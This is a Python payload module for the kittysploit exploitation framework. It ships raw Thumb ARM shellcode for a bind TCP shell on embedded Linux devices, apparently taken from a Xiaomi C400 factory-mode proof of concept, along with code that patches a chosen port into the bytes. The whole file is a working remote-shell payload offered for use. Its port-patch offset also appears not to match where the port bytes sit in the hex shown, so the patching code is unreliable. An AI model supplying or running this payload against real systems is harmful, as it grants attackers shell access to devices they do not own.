#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Thumb ARM bind TCP shell (raw bytes) for embedded Linux targets.

Derived from the Xiaomi C400 factory-mode PoC bind shell (Botond Hartmann, 2025).
"""

from kittysploit import *


class Module(Payload):
    __info__ = {
        "name": "ARM LE bind TCP shell (raw)",
        "description": (
            "Thumb ARM 32-bit bind shell: socket, bind, listen, accept, dup2 x3, "
            "execve /bin/sh. Null-free port encoding when possible."
        ),
        "category": PayloadCategory.CMD,
        "arch": Arch.ARM,
        "platform": Platform.LINUX,
        "listener": "listeners/multi/bind_tcp",
        "handler": Handler.BIND,
        "session_type": SessionType.SHELL,
    }

    rhost = OptString("0.0.0.0", "Address to bind on the target", True)
    rport = OptPort(5555, "Port to bind on the target", True)
    encoder = OptString("", "Encoder module, e.g. encoders/armle/xor", False, True)

    # Original PoC shellcode (port 5555 = 0x15b3 immediate at byte offset 34).
    _SHELLCODE_TEMPLATE = bytes.fromhex(
        "4ff001074fea072707f119074ff002004ff0010182ea020201df0646004901"
        "e0020015b306b469464ff0100207f1010701df30464ff0010107f1020701"
        "df304681ea010182ea020207f1010701df06464ff002014ff03f07304601"
        "df0139fbd54ff0680780b4dff8047001e02f2f2f7380b468464ff00d074fe"
        "ac72707f1730780b487ea070780b44ff00401694402b4694682ea02024ff00"
        "b0741df"
    )
    _PORT_PATCH_OFFSET = 34

    @classmethod
    def _encode_port_immediate(cls, port: int) -> tuple[int, int]:
        port = int(port)
        if port < 1 or port > 65535:
            raise ValueError("rport must be between 1 and 65535")
        hi = (port >> 8) & 0xFF
        lo = port & 0xFF
        if hi == 0 or lo == 0:
            raise ValueError("rport cannot contain a null byte; choose another port")
        return hi, lo

    @classmethod
    def build_armle_bind_shell(cls, rport: int) -> bytes:
        hi, lo = cls._encode_port_immediate(rport)
        shellcode = bytearray(cls._SHELLCODE_TEMPLATE)
        shellcode[cls._PORT_PATCH_OFFSET] = hi
        shellcode[cls._PORT_PATCH_OFFSET + 1] = lo
        return bytes(shellcode)

    def generate(self):
        return self.build_armle_bind_shell(int(self.rport))
